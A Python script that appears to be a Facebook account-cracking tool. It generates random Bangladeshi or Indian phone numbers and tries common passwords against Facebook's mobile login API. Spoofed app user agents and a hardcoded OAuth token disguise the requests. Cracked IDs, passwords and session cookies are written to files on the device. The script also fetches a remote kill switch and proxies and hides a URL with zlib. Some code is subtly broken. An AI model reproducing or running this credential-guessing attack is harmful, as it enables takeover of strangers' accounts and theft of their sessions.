import bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
import os
import random
import os
import sys
import time
import uuid
from os import system as s
import os,sys,time,json,random,re,string,platform,base64,uuid,zlib,subprocess
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
from pip._vendor import requests as requests
from concurrent.futures import ThreadPoolExecutor as tred
import mechanize
from urllib import request as req
from zlib import decompress as dec
from requests.exceptions import ConnectionError
session=requests.Session()
loop = 0
ok=0
cp=0
oks = []
cps = []
id=[]
twf=[]
ugen=[]
ugen2=[]
ugent = []
methods=[]
android_models=[]
try:
 prox= requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
#----------[SIM IP COUNTRY]----------#
desh = requests.get("http://ip-api.com/json/").json()["country"]
#------------------[ USER AGENT ]-------------------#
linkss = zlib.decompress(b'x\x9c\x05\xc1K\x0e\x80 \x0c\x05\xc0\x13I]\xb0r\xeb\xde;\x14\xd2`C\xf8\xa4}D\xbd\xbd370\xfd 2~BQ\xdc+-\x17\xcb\xa3C:B\x1e\x8d.\xad\x1a\xf7\xb8\x9d_\x12\xa3\xc9\xb9r\x11\xa7\xc6\xda\xc9a\xda\x8b\x07\xbc\xf8\x01\xf4V\x1bk')
try:
    xx = requests.get(linkss).text.splitlines()#
    for line in xx:
        android_models.append(line)
except:pass
#------------------[ COLOURS ]-------------------#
AA = "\033[1;91m"
BB = "\033[1;92m"
CC = "\033[1;93m"
DD = "\033[1;94m"
EE = "\033[1;95m"
FF = "\033[1;96m"
GG = "\033[1;97m"
HH = "\033[1;90m"
AC = "\033[1;41m"
BC = "\033[1;0m"
loooop = 0
#.  os.system("xdg-open https://www.github.com/arifin-212")
os.system('clear')
def __banner___():
    print(f"""\033[1;32m88     88   88  dP""b8 88  dP Yb  dP 
88     88   88 dP   `" 88odP   YbdP  
88  .o Y8   8P Yb      88"Yb    8P   
88ood8 `YbodP'  YboodP 88  Yb  dP    
\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;37m[\033[1;92m<>\033[1;37m] \033[1;92mFB         :  LUCKY              
\033[1;37m[\033[1;92m<>\033[1;37m] \033[1;92mGITHUB     :  LUCKY-428                 
\033[1;37m[\033[1;92m<>\033[1;37m] \033[1;92mVERSIONS   :  \033[1;37m3.0                   
\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
os.system('clear')
print('\033[1;37mImporting Modules...')
time.sleep(5)
os.system('clear')
try:
	os.system('clear')
	serv = requests.get('https://raw.githubusercontent.com/LUCKY-428/SERVER/main/MAIN-SERV').text
	if "main" in serv:
		os.system('clear')
		__banner___()
		print(f'\033[1;96m[\033[1;95m>\033[1;94m+\033[1;95m<\033[1;96m] \033[1;92mMAINTENANCE BREAK \n')
		sys.exit()
	if "off" in serv:
		os.system('clear')
		print(logo)
		print(f'\033[1;96m[\033[1;95m>\033[1;94m+\033[1;95m<\033[1;96m] \033[1;92mTOOL IS OFF NOW ')
		sys.exit()
	if "up" in serv:
		os.system('clear')
		__banner___()
		print('\033[1;96m[\033[1;95m>\033[1;94m+\033[1;95m<\033[1;96m] \033[1;92mTOOL UPDATING \n\n')
		sys.exit()
	if "serv" in serv:
		os.system('clear')
		print(logo)
		print('\033[1;96m[\033[1;95m>\033[1;94m+\033[1;95m<\033[1;96m] \033[1;92mSERVER IS OFF')
		sys.exit()
except requests.exceptions.ConnectionError:
	print("FIX YOUR INTERNET BRUH")
	sys.exit()
def aysha():
        print("\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
method=[] 
def main():
    os.system('clear')
    __banner___()
   ## print(f"\033[1;37m[\033[1;92m1\033[1;37m] \033[1;92mFILE CRACKING ")
    print(f"\033[1;37m[\033[1;92m1\033[1;37m] \033[1;92mRANDOM CRACK ")
    print(f"\033[1;37m[\033[1;92m2\033[1;37m] \033[1;92mINDIA CRACK")
    # print(f"\033[1;37m[\033[1;36mE\033[1;37m] \033[1;37mCONTACT WITH CREATOR ")
    print(f"\033[1;37m[\033[1;92mE\033[1;37m] \033[1;92mEXIT ")
    aysha()
    arifin= input('\033[1;37m[\033[1;92m>\033[1;37m] \033[1;92mSELECT : ')
    if arifin in ['4','01','A','a']:
        ___mix___()
    elif arifin in ['1','02','B','b']:
        ___mix___()
    elif arifin in ['2','03','C','c']:
        #  os.system('xdg-open https://www.facebook.com/iam.arifinrashid')
        __ind__()
    elif arifin in ['4','04','D','d']:
        __ind__()
    elif arifin in ['0','00','E','e']:
        exit()
    else:
        print('\n\033[1;91m[x] Choose valid option ... ');arifin()

os.system('clear')
###########---RANDOM---#########
def ___mix___():
    user=[]
    os.system('clear')
    __banner___()
    #. os.system('clear')
    print('\033[1;92m[<>] BD SIM CODE : \033[1;92m 017,018,019,016 ')
    # print('\033[1;33m[>] IND SIM CODE : \033[1;32m[ +91637 +91704 +91793 ]')
#. os.system("xdg-open https://www.facebook.com/iam.arifinrashid")
    code = input('\033[1;92m[>] SELECT : ')
  # os.system('xdg-open https://github.com/ARIFIN-212')
    print()
    print('\033[1;92m[<>] EXAMPLE : \033[1;32m1000,2000,5000,10000,20000')
    limit = int(input('\033[1;92m[>] LIMIT : '))
    #.  os.system('xdg-open https://www.facebook.com/profile.php?id=100093241763897')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        id.append(nmp)
    with tred(max_workers=30) as ___mal___:
        os.system('clear')
        __banner___()
        tl = len(user) 
        print(f"\033[1;92m[~]\033[1;92m TOTAL CRACK \033[1;92m : {limit}")
        print('\033[1;92m[~]\033[1;92m SIM CODE\033[1;92m     : '+code)
       #  print('\033[1;37m[×]\033[1;36m USE APN FOR BETTER RESULT')
        aysha()
        for love in id:
           ids = code+love #11digit + uid
           vu = love[:6] #6digit
           au = love[:7] #7digit | love mane 8digit 
           bu = ids[:8] #1st 8digit
           pwv = [love,au,bu,"sadiya","102030","708090","203040","taniya","mababa","jannat","bristy","alamin","sabbir","shakib","farjana","sultana","afsana",]
           ___mal___.submit(___mixt___,ids,pwv,tl)      
    print('')
    input(f"\n\033[1;32m[😮‍💨] CRACK PROCESS SUCCESSFUL\n[>] EXIT ")
    exit()   
def __ind__():
    user=[]
    os.system('clear')
    __banner___()
    # print('\033[1;33m[<] BD SIM CODE : \033[1;32m[ 017 018 019 016 ]')
    print('\033[1;32m[>] IND SIM CODE : \033[1;32m +91637,+91704,+91793 ')
#. os.system("xdg-open https://www.facebook.com/iam.arifinrashid")
    code = input('\033[1;32m>> SELECT : ')
  # os.system('xdg-open https://github.com/ARIFIN-212')
    print('\033[1;32m[<>] EXAMPLE : \033[1;32m1000,2000,5000,10000,20000]')
    limit = int(input('\033[1;92m [>] LIMIT : '))
   #.   os.system('xdg-open https://www.facebook.com/profile.php?id=100093241763897')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        id.append(nmp)
    with tred(max_workers=30) as ___mal___:
        os.system('clear')
        __banner___()
        tl = str(len(user)) 
        print(f"\033[1;37m[×]\033[1;37m TOTAL CRACK \033[1;36m : {limit}")
        print('\033[1;37m[×]\033[1;37m SIM CODE\033[1;36m     : '+code)
        print('\033[1;37m[×]\033[1;36m USE APN FOR BETTER RESULT')
        aysha()
        for love in id:
           ids = code+love #11digit + uid
           vu = love[:6] #6digit
           au = love[:7] #7digit | love mane 8digit 
           bu = ids[:8] #1st 8digit
           pwv = [love,au,bu,"57273200",]
           ___mal___.submit(___mixt___,ids,pwv,tl)      
    print('')
    input(f"\n\033[1;32m[😮‍💨] CRACK PROCESS SUCCESSFUL\n[>] EXIT ")
    exit()   
import random
iphone_models = [
    "iPhone 12 Pro Max",
    "iPhone 12 Pro",
    "iPhone 12",
    "iPhone 12 Mini",
    "iPhone SE (2nd generation)",
    "iPhone 11 Pro Max",
    "iPhone 11 Pro",
    "iPhone 11",
    "iPhone XS Max",
    "iPhone XS",
    "iPhone XR",
    "iPhone X",
    "iPhone 8 Plus",
    "iPhone 8",
    "iPhone 7 Plus",
    "iPhone 7",
    "iPhone SE",
    "iPhone 6s Plus",
    "iPhone 6s",
    "iPhone 6 Plus",
    "iPhone 6",
    "iPhone 5s",
    "iPhone 5c",
    "iPhone 5",
    "iPhone 4s",
    "iPhone 4",
    "iPhone 3GS",
    "iPhone 3G",
    "iPhone",
    "iPhone 11 Pro Max",
    "iPhone 11 Pro",
    "iPhone 11",
    "iPhone XS Max",
    "iPhone XS",
    "iPhone XR",
    "iPhone X",
    "iPhone 8 Plus",
    "iPhone 8",
    "iPhone 7 Plus",
    "iPhone 7",
    "iPhone SE",
    "iPhone 6s Plus",
    "iPhone 6s",
    "iPhone 6 Plus",
    "iPhone 6",
    "iPhone 5s",
    "iPhone 5c",
    "iPhone 5",
    "iPhone 4s",
    "iPhone 4",
    "iPhone 3GS",
    "iPhone 3G",
    "iPhone"]
def uaa():
    model = random.choices(iphone_models)[0]
    ios_version = f"{random.randint(10, 14)}.{random.randint(0, 9)}"
    safari_version = f"{random.randint(10, 14)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
    user_agent = f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios_version} like Mac OS X) AppleWebKit/{safari_version} (KHTML, like Gecko) Version/{safari_version} Mobile/15E148 Safari/{safari_version}" 
    return user_agent
uaa = [uaa() for _ in range(50000)]
def uaa():
    and_vers = random.randint(4,13)
    and_mod = random.choice(android_models)
    app_uld = str(random.randint(111111,999999))+'.'+str(random.randint(111,999))
    and_id = str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
    app_ver = str(random.randint(99,999))+'.'+str(random.randint(99,999))+'.'+str(random.randrange(99,999))+'.'+str(random.randint(99,999))+'.'+str(random.randint(99,999))
    app_vercode = str(random.randint(000000000,999999999))
    pkg_name = random.choice(('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana'))
    ua = 'Dalvik/2.1.0 (Linex; U; Android {and_vers}; Samsung s5 Build/OPM7.{app_uld}) [FBAN/FB4A;FBAV/332.0.0.4.152;FBBV/896593247;FBDM/{density=3.4,width=1080,height=1446};FBLC/en_GB;FBRV/439894270;FBCR/FASTWEB;FBMF/Samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Galaxy S5;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
    return ua
def uaa():
    and_vers = random.randint(4,13)
    and_mod = random.choice(android_models)
    app_uld = str(random.randint(111111,999999))+'.'+str(random.randint(111,999))
    and_id = str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
    app_ver = str(random.randint(99,999))+'.'+str(random.randint(99,999))+'.'+str(random.randrange(99,999))+'.'+str(random.randint(99,999))+'.'+str(random.randint(99,999))
    app_vercode = str(random.randint(000000000,999999999))
    pkg_name = random.choice(('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana'))
    ua = f'Dalvik/2.1.0 (Linux; U; Android {and_vers}; {and_mod} Build/QP1A.{app_uld} [FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/'+'{density=3.0,width=1080,height=1776}'+';FBLC/en_'+'US;'+'FBCR/Vi'+'deo'+'tr'+'on;FBMF/m'+'otor'+'ola;FBBD/mo'+'tor'+'ola;FBPN/com.facebook.katana;FBDV/X'+'T156'+'3;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {and_vers}; {and_mod} Build/QP1A.{app_uld}) [FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371898012;FBDM/'+'{density=2.75,width=1080,height=2130}'+';FBLC/en_GB;FBRV/374252804;FBCR/#ParMieru;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {and_vers}; {and_mod} Build/QP1A.{app_uld})  [FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097173;FBDM/'+'{density=2.0,width=720,height=2280}'+';FBLC/en_GB;FBCR/Sunrise;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G700F;FBSV/4.1.2;nullFBCA/armeabi-v7a:armeabi;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {and_vers}; {and_mod} Build/QP1A.{app_uld}) [FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/'+'{density=1.5,width=540,height=888}'+';FBLC/en_US;FBCR/ETB 4G;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1022;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]'
    ua = f'Dalvik/2.1.0 (Linex; U; Android {and_vers}; {and_mod} Build/SM-T311.{app_uld}) [FBAN/FB4A;FBAV/313.0.0.13315;FBBV/537950163;FBDM/'+'{density=2.0,width=720,height=1280}'+';FBLC/es_CU;FBRV/537950163;FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9195H;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {and_vers}; {and_mod} Build/KTU84P.{app_uld}) [FBAN/FB4A;FBAV/540.0.0.84.626;FBBV/169717250;FBDM/'+'{density=4.0,width=1532,height=2560}'+';FBLC/en_US;FBCR/Grameenphone;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9300I;FBSV/6.0.0;FBCA/armeabi-v7a:armeabi;]'
    ua = f'Dalvik/2.1.0 (Linex; U; Android {and_vers}; {and_mod} Build/GT-E2252.{app_uld}) [FBAN/FB4A;FBAV/203.0.0.39346;FBBV/678595966;FBDM/'+'{density=2.0,width=720,height=1280}'+';FBLC/en_US;FBRV/678595966;FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9100LKLCHT;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    return ua
def uaa():
    and_vers = random.randint(4,5,12)
    and_mod = random.choice(android_models)
    app_uld = str(random.randint(111111,999999))+'.'+str(random.randint(111,999))
    and_id = str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
    app_ver = str(random.randint(99,999))+'.'+str(random.randint(99,999))+'.'+str(random.randrange(99,999))+'.'+str(random.randint(99,999))+'.'+str(random.randint(99,999))
    app_vercode = str(random.randint(000000000,999999999))
    pkg_name = random.choice(('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana'))
    ua = "[FBAN/FB4A;FBAV/237.0.0.3.116;FBBV/991747801;FBDM/{density=2.4,width=1080,height=1402};FBLC/en_IN;FBRV/390164012;FBCR/Telenor;FBMF/Lava;FBBD/Lava;FBPN/com.facebook.katana;FBDV/iris X1;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
    return ua
def uaa():
    and_vers = random.randint(4,12)
    and_mod = random.choice(android_models)
    app_uld = str(random.randint(111111,999999))+'.'+str(random.randint(111,999))
    and_id = str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
    app_ver = str(random.randint(99,999))+'.'+str(random.randint(99,999))+'.'+str(random.randrange(99,999))+'.'+str(random.randint(99,999))+'.'+str(random.randint(99,999))
    app_vercode = str(random.randint(000000000,999999999))
    pkg_name = random.choice(('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana'))
    ua = "[FBAN/FB4A;FBAV/356.0.0.3.138;FBBV/766769450;FBDM/{density=3.3,width=1080,height=1442};FBLC/en_US;FBRV/335184783;FBCR/EE;FBMF/Samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Galaxy A7;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    return ua
ugen=[]
def uaa():
    android_versions = list(range(4, 13))
    samsung_models = ['Galaxy S6', 'Galaxy S7', 'Galaxy S8', 'Galaxy S9', 'Galaxy S10', 'Galaxy Note 5', 'Galaxy Note 8', 'Galaxy Note 9', 'Galaxy A5', 'Galaxy A7', 'Galaxy J5', 'Galaxy J7']
    huawei_models = ['P10', 'P20', 'P30', 'Mate 10', 'Mate 20', 'Y7', 'Y9', 'Nova 3i']
    xiaomi_models = ['Redmi Note 5', 'Redmi Note 6', 'Redmi Note 7', 'Redmi Note 8', 'Redmi Note 9', 'Mi A1', 'Mi A2', 'Mi 8', 'Mi 9', 'Poco F1']
    oppo_models = ['F7', 'F9', 'A3s', 'A5s', 'A7', 'A9', 'R11', 'R17', 'Reno 2', 'Reno 3']
    vivo_models = ['Y55', 'Y71', 'Y81', 'Y91', 'Y93', 'Y95', 'V9', 'V11', 'V15', 'S1']
    realme_models = ['C1', 'C2', '3 Pro', '5 Pro', 'X', 'X2']
    android_models = {
        'samsung': samsung_models,
        'huawei': huawei_models,
        'xiaomi': xiaomi_models,
        'oppo': oppo_models,
        'vivo': vivo_models,
        'realme': realme_models,
    }
    and_vers = random.choice(android_versions)
    brand = random.choice(list(android_models.keys()))
    and_mod = random.choice(android_models[brand])
    and_id = f'{random.randint(9,99)}.0.0.{random.randint(9,99)}{random.randint(9,99)}'
    app_uld = f'{random.randint(111111, 999999)}.{random.randint(111,999)}'
    app_ver = f'{random.randint(99,999)}.{random.randint(99,999)}.{random.randint(99,999)}.{random.randint(99,999)}'
    app_vercode = str(random.randint(100000000,999999999))
    pkg_name = random.choice(('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana'))
    ua = f'Dalvik/2.1.0 (Linux; U; Android {and_vers}; {brand} {and_mod} Build/SKQ1.{app_uld}) [FBAN/EMA;FBLC/en_US;FBAV/{app_ver};FBBV/{app_vercode};FBDV/{and_mod};FBMD/{brand};FBSN/{and_id};FBPN/{pkg_name}]'
    return ua
def convert(cookie):
        coki2 = ('datr=%s;sb=%s;c_user=%s;xs=%s;fr=%s'%(cookie['datr'],cookie['sb'],cookie['c_user'],cookie['xs'],cookie['fr']))    
def ___mixt___(ids,pwv,tl):
    global loop,oks,cps,twf
    sys.stdout.write(f'\r\033[1;32m~[\033[1;92mLUCKY-XD\033[1;32m]-[\033[1;32m{loop}\033[1;97m/\033[1;32m{str(len(id))}\033[1;32m]-\033[1;32m[\033[1;32mOK:{len(oks)}\033[1;32m] ');sys.stdout.flush()
    try:
        for pas in pwv:
            data={'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': ids,
                    'password': pas,
                    'generate_analytics_claims': '1',
                    'community_id': '',
                    'cpl': 'true',
                    'try_num': '1',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'currently_logged_in_userid': '0',
                    'locale': 'en_GB',
                    'client_country_code': 'GB',
                    'fb_api_req_friendly_name': 'authenticate'}
            head={'User-Agent': uaa(),
                    'Accept-Encoding':  'gzip, deflate',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-Friendly-Name': 'authenticate',
                    'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'unknown',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-FB-HTTP-Engine': 'Liger'}  
            po = requests.post('https://'+'b-gr'+'ap'+'h'+'.facebook.com/auth/login',data=data,headers=head,allow_redirects=False).json()
            if 'access_token' in po:
                coki = po["session_cookies"]
                cok = {}
                for x in coki:
                    cok.update({x["name"]:x["value"]})
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                ids = re.findall('c_user=(.*);xs', kuki)[0]
                print(f'\r\33[1;92m~[LUCKY-OK] '+ids+' ~ '+pas+'\033[1;92m')
                #. print(f"\r\33[1;36mCOOKIES=[🐼]: {kuki}\33[1;36m")
                oks.append(ids)
                open('/sdcard/LUCKY-OKS.txt','a').write(ids+' | '+pas+'\n')
                open('/sdcard/ARIFIN-COOKIE','a').write(kuki+'\n')
                break
            elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        ids = po['error']['error_data']['uid']
                                except:
                                        ids = ids
                                if ids in oks:pass
                                else:
                                        #print('\r\r\033[1;30m [LUCKY-CP] \033[1;30m'+str(ids)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/LUCKY-rnd-CP.txt','a').write(str(ids)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
            else:continue
        loop+=1
    except Exception as e:
        pass
main()
